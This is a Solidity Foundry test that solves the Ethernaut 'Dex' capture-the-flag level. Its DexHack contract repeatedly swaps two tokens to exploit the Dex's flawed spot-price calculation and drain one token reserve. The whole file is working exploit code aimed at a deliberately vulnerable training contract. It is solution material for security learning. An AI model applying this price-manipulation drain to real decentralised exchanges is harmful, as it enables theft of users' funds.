// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Dex/Dex.sol";
import "levels/Dex/DexFactory.sol";
import "./utils/EthernautTest.sol";

contract DexHack {
    Dex public victim;

    constructor(address _targetAddress) {
        victim = Dex(_targetAddress);
    }

    function exploit() external {
        address[2] memory tokens = [victim.token1(), victim.token2()];

        SwappableToken(tokens[0]).approve(address(victim), type(uint256).max);
        SwappableToken(tokens[1]).approve(address(victim), type(uint256).max);

        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;

        uint256 fromIndex = 0;
        uint256 toIndex = 1;

        while (true) {
            hackBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
                SwappableToken(tokens[toIndex]).balanceOf(address(this))
            ];

            dexBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(victim)),
                SwappableToken(tokens[toIndex]).balanceOf(address(victim))
            ];

            uint256 swapPrice = victim.get_swap_price(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            if (swapPrice > dexBalances[1]) {
                victim.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            } else {
                victim.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }

            (fromIndex, toIndex) = (toIndex, fromIndex);
        }
    }
}

contract DexTest is Test {
    function test_dex() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        DexFactory dexFactory = new DexFactory();
        address levelAddress = ethernautTest.setup(dexFactory);
        Dex dexContract = Dex(levelAddress);

        // Exploit
        vm.startPrank(tx.origin);
        DexHack dexHack = new DexHack(levelAddress);
        IERC20(dexContract.token1()).transfer(address(dexHack), IERC20(dexContract.token1()).balanceOf(tx.origin));
        IERC20(dexContract.token2()).transfer(address(dexHack), IERC20(dexContract.token2()).balanceOf(tx.origin));
        dexHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
